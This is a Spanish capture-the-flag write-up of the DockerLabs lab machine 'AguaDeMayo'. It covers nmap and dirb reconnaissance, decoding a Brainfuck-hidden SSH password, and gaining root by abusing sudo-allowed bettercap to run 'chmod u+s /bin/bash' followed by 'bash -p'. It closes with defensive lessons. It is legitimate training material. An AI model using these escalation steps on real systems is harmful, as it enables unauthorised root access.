# AguaDeMayo — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** The Hackers Labs  
**Fecha de creación:** 14/05/2024  
**Técnicas:** Nmap · Dirb · Código fuente (Brainfuck) · Dcode.fr · SSH · Privesc (bettercap/sudo)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — código oculto en el fuente](#2-enumeración-web--código-oculto-en-el-fuente)
3. [Decodificación Brainfuck](#3-decodificación-brainfuck)
4. [Acceso SSH](#4-acceso-ssh)
5. [Escalada de privilegios — bettercap](#5-escalada-de-privilegios--bettercap)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh aguademayo.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo con volcado a fichero:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
| http-title: Apache2 Debian Default Page: It works
```

---

## 2. Enumeración web — código oculto en el fuente

Visitamos `http://172.17.0.2` — página por defecto de Apache. Lanzamos dirb para buscar directorios:

```bash
dirb http://172.17.0.2
```

```
GENERATED WORDS: 4612
==> DIRECTORY: http://172.17.0.2/images/
+ http://172.17.0.2/index.html  (CODE:200|SIZE:11142)
```

Directorio `/images/` con una imagen `agua_ssh.jpg` y página por defecto. Inspeccionamos el código fuente de `index.html` (Ctrl+U) y encontramos un comentario con texto extraño al final:

```
+++++++[>+++++++++++++>+++++>+++<<<<-]>---.>++.>-.+++.----.++++.
```

> 💡 Este es código **Brainfuck** — un lenguaje de programación esotérico minimalista con solo 8 comandos (`<>+-.,[]`). Es ilegible para humanos pero ejecutable. En CTFs se usa para ocultar contraseñas.

---

## 3. Decodificación Brainfuck

Usamos [dcode.fr](https://www.dcode.fr/) → seleccionamos **Brainfuck Interpreter** → pegamos el código:

```
Input: +++++++[>+++++++++++++>+++++>+++<<<<-]>---.>++.>-.+++.----.++++.
Output: bebeaguaqueessano
```

> 💡 La imagen del directorio se llama `agua_ssh` — probablemente el usuario SSH sea **agua** y la contraseña sea lo que acabamos de decodificar.

---

## 4. Acceso SSH

```bash
ssh agua@172.17.0.2
```

```
agua@172.17.0.2's password: bebeaguaqueessano
agua@74bb0f12f555:~$
```

✅ Acceso como **agua**.

---

## 5. Escalada de privilegios — bettercap

Comprobamos permisos sudo:

```bash
agua@74bb0f12f555:~$ sudo -l
```

```
User agua may run the following commands on 74bb0f12f555:
    (root) NOPASSWD: /usr/bin/bettercap
```

**bettercap** con sudo sin contraseña. Lo ejecutamos y exploramos los comandos disponibles con `help`:

```bash
agua@74bb0f12f555:~$ sudo /usr/bin/bettercap
bettercap v2.32.0 > help
```

```
! COMMAND  : Execute a shell command and print its output.
```

El comando `!` ejecuta comandos del sistema como root. Usamos esto para activar el bit SUID en `/bin/bash`:

```bash
172.17.0.0/16 > 172.17.0.2 » ! chmod u+s /bin/bash
172.17.0.0/16 > 172.17.0.2 » exit
```

Ahora ejecutamos bash con privilegios del propietario (root):

```bash
agua@74bb0f12f555:~$ bash -p
bash-5.2# whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Contraseña en Brainfuck en código fuente** | `index.html` | Credenciales SSH sin protección real |
| **bettercap con sudo sin restricción** | `/usr/bin/bettercap` | Ejecución de comandos como root via `!` |

**Para defenderse:**
- Los encodings como Brainfuck, Base64 o ROT13 no son cifrado — cualquiera puede decodificarlos. Nunca ocultar credenciales en el código fuente.
- bettercap (y cualquier herramienta de red) con permisos sudo puede ejecutar comandos del sistema. Si se necesita para un usuario específico, restringir con AppArmor o SELinux.
- `bash -p` mantiene los privilegios elevados si el binario tiene SUID. Evitar activar SUID en bash.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
